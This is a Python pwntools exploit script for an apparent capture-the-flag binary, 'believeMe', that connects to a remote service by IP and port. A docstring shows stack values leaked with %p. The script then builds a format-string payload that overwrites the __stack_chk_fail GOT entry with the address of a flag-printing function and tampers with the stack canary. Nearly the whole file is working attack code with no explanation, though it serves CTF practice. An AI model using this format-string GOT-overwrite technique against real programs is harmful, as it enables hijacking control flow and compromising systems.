#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import roputils as rp
import os
import sys

elfPath = "./believeMe"
libcPath = ""
remoteAddr = "18.223.228.52"
remotePort = 13337

context.binary = elfPath
elf = context.binary
if sys.argv[1] == "l":
    io = process(elfPath)
    libc = elf.libc

else:
    if sys.argv[1] == "d":
        io = process(elfPath, env = {"LD_PRELOAD": libcPath})
    else:
        io = remote(remoteAddr, remotePort)
    if libcPath:
        libc = ELF(libcPath)

context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG(bps = [], pie = False):
    cmd = "set follow-fork-mode parent\n"
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        cmd += ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd += ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c"

    gdb.attach(io, cmd)

if __name__ == "__main__":
    '''
    believeMe nc 18.223.228.52 13337

    Someone told me that pwning makes noxāle...
    But......... how ????
    %19$p
    0x60d3cf00^C
    believeMe nc 18.223.228.52 13337
    
    Someone told me that pwning makes noxāle...
    But......... how ????
    %18$p
    0xffffddcc^C
    believeMe
    '''
    canary_addr = 0xffffddcc - 0xc0
    payload = p32(elf.got['__stack_chk_fail']) + p32(canary_addr) + "%{}c%{}$hn".format((elf.sym['noxFlag'] & 0xffff) - 8, 9) + "%10$hhn"
    assert len(payload) < 40
    #  DEBUG([0x80487D3])
    io.sendlineafter("???? \n", payload)

    io.interactive()
